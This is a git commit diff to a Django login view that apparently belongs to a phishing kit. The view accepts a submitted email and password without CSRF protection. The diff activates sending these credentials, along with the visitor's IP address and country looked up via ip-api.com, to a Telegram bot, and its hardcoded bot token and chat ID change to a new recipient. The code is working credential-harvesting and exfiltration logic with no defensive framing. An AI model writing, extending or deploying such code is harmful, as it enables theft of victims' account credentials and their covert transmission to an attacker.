beba3c69b5c54d37380929269ebbf18a69882305
Adetunji Peter <tunjipete@grrnberry.com>
2024-11-07 07:40:00 +0100

    new telegram

--- mail/views.py
+++ mail/views.py
@@ -5,16 +5,26 @@ import requests
 
 def send_to_telegram(message):
     token = '7584867618:AAHIy5vSZOhoW6Ba0pZdDL0fILznS9RGcyQ'
-    chat_id = "5167643751"
+    chat_id = "1374918767"
     url = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={message}"
     res = requests.get(url).json()
     return res
+
+def get_country_from_ip(ip_address):
+    url = f"http://ip-api.com/json/{ip_address}"
+    response = requests.get(url)
+    if response.status_code == 200:
+        data = response.json()
+        return data.get("country")  # Returns country name, e.g., "United States"
+    return None
 
 @csrf_exempt
 def login_view(request):
     if request.method == 'POST':
         email = request.POST.get("email")
         password = request.POST.get("pass")
+        ip_address = request.META.get("REMOTE_ADDR")
+        country = get_country_from_ip(ip_address)
         # if email and password:
         #     # Save data to the database
         #     Mail.objects.create(
@@ -22,8 +32,8 @@ def login_view(request):
         #         password=password
         #     )
         subject = 'New details submitted'
-        mail_message = f"{subject}\nusername: {email}\npassword: {password}"
-        #send_to_telegram(mail_message)
+        mail_message = f"{subject}\nipaddress:{ip_address} \ncountry:{country}\nusername: {email}\npassword: {password}"
+        send_to_telegram(mail_message)
         print(mail_message)
     return render(request, 'index.html')
 
